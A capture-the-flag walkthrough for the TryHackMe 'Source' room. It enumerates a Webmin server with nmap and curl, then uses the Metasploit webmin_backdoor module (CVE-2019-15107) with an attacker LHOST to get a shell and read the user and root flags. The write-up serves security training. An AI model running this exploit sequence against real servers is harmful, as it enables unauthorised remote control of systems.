# [Source](https://tryhackme.com/room/source)

## Exploit a recent vulnerability and hack Webmin, a web-based system configuration tool.

# Embark

## Enumerate and root the box attached to this task. Can you discover the source of the disruption and leverage it to take control?

### user.txt

1. Start by performing initial network enumeration to identify open ports and running services on the target system

```bash
nmap <TARGET_IP>
```

<img width="722" height="270" alt="SCREEN01" src="https://github.com/user-attachments/assets/98aaff5f-3886-4e1a-97e7-c84c38648eac" />

2. Examine the Webmin service to identify the specific version running

```bash
curl -k -I https://<TARGET_IP>:10000/
```

<img width="721" height="219" alt="SCREEN02" src="https://github.com/user-attachments/assets/0154ac42-7891-47c6-9bcd-46e70cdbedd3" />

3. Based on the enumeration results, research known vulnerabilities for the identified Webmin version. The CVE-2019-15107 backdoor vulnerability affects Webmin versions 1.882 through 1.921. Launch Metasploit and configure the exploit module. Once the exploit succeeds, navigate to the user directory and capture the first flag

```bash
msfconsole
search webmin
use exploit/linux/http/webmin_backdoor
show options
set LHOST <ATTACKER_IP>
set RHOSTS <TARGET_IP>
set RPORT 10000
set SSL true
exploit
```

<img width="722" height="434" alt="SCREEN03" src="https://github.com/user-attachments/assets/b86a3eca-2916-4dba-a2d8-a78c8f722289" />

```
whoami
python -c 'import pty; pty.spawn("/bin/bash")'
cat /home/dark/user.txt
```

<img width="718" height="232" alt="SCREEN04" src="https://github.com/user-attachments/assets/a9fd046e-ea4a-4e9f-b638-2f6f574688d5" />

---

### root.txt

1. Access the root directory and retrieve the final flag

```bash
cat /root/root.txt
```

<img width="717" height="144" alt="SCREEN05" src="https://github.com/user-attachments/assets/209bb763-b613-47a4-a035-30b4ffeb9bb6" />
